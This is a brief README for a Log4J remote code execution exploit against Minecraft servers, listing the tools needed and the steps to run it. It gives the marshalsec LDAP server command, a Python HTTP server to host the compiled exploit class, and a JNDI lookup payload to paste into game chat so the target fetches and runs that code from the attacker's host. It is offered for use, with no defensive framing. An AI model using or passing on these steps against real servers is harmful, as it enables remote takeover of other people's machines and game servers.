# Minecraft Log4J RCE

Requirements:

- a vps
- java (Duh)
- python
- marshalsec

How to run the exploit

- Compile the exploit with your values
- Run the following commands in the terminal `java -cp [MarshalSec] marshalsec.jndi.LDAPRefServer http://localhost:8888/#Exploit`
- Open a new terminal instance and run `python -m http.server 8888`
- Then send this in the chat `${jndi:ldap://ip:1389/#Exploit}`
- Done :)
